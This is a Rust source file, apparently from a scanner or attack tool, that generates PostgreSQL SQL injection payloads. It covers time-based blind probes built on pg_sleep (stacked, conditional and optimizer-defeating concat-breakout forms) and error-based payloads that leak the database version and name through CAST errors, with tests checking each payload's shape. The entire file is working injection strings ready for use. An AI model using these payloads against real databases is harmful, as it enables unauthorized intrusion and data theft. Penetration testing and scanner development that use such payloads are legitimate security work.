#![deny(unsafe_code)]
#[must_use]
pub fn pg_time(secs: u64) -> String {
    format!("'; SELECT pg_sleep({secs}) --")
}

/// Conditional variant: only sleeps when the condition holds.
#[must_use]
pub fn pg_time_conditional(secs: u64) -> String {
    format!("'; SELECT CASE WHEN (1=1) THEN pg_sleep({secs}) ELSE pg_sleep(0) END --")
}

/// Inline concat-breakout variant: no `;` stacked query, breaks out of a
/// string context via `||` concatenation. Wraps `pg_sleep` in
/// `SELECT 1 FROM (SELECT pg_sleep(..))x` to defeat statement optimizers
/// that would skip a bare `SELECT pg_sleep`.
#[must_use]
pub fn pg_time_concat(secs: u64) -> String {
    format!("'||(SELECT 1 FROM (SELECT pg_sleep({secs}))x)||' --")
}

/// Canonical Postgres error-based set — legacy first (compat), then variant.
///
/// - `[0]` legacy `CAST(version() AS int)` — `invalid input syntax` channel
/// - `[1]` legacy `CAST(current_database() AS int)`
/// - `CAST(chr(126)||version()||chr(126) AS int)` — tilde-delimited exfil
///   variant (`chr()` avoids quoting issues, value surfaces in
///   `invalid input syntax for type integer: "~...~"`).
#[must_use]
pub fn pg_error_payloads() -> Vec<String> {
    vec![
        "' AND CAST((SELECT version()) AS int) --".to_owned(),
        "' AND 1=CAST((SELECT current_database()) AS int) --".to_owned(),
        "' AND 1=CAST((SELECT chr(126)||version()||chr(126)) AS int) --".to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_shape() {
        assert_eq!(pg_time(5), "'; SELECT pg_sleep(5) --");
    }

    #[test]
    fn conditional_shape() {
        let p = pg_time_conditional(5);
        assert!(p.contains("CASE WHEN (1=1)"), "{p}");
        assert!(p.contains("pg_sleep(5)"), "{p}");
    }

    #[test]
    fn concat_shape() {
        let p = pg_time_concat(5);
        assert!(p.contains("||"), "{p}");
        assert!(p.contains("pg_sleep(5)"), "{p}");
        assert!(p.contains("FROM (SELECT"), "{p}");
        assert!(p.contains("SELECT 1 FROM (SELECT pg_sleep"), "{p}");
        assert!(p.ends_with(" --"), "{p}");
        assert!(!p.contains(';'), "{p}");
    }
}
